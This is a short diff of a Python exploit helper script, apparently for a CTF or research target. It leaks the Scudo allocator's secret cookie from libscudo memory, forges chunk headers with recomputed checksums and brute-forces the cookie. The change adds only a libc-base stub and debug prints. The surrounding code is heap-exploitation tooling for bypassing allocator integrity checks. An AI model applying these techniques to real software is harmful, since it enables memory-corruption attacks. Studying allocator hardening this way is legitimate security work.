@@ -47,13 +47,18 @@ def get_libscudo_base(io, SCUDO_LIB ):
     scudo_base = io.libs()[os.path.realpath(SCUDO_LIB)]
     return scudo_base
 
+def get_libc_base(io):
+    pass
+
 def get_cookie_cheat(io, scudo_base):
     cookie = read(io, scudo_base+0x36000, 0x10)[0] # offset for libscudo-linux.so (md5sum: 6a1cb7efd0595861c21ca3cbd35e1657)
     return cookie 
 
 def forge_header(address, cookie, new_header) -> bytes:
     new_checksum = calc_checksum(address, cookie, new_header)
+    print(f'checksum: {hex(new_checksum)}')
     forged_header = new_header + (new_checksum << 0x30)
+    print(f'forged header :  {hex(forged_header)}')
     return forged_header.to_bytes(8, 'little')
 
 def bruteforce_cookie(io, addr):
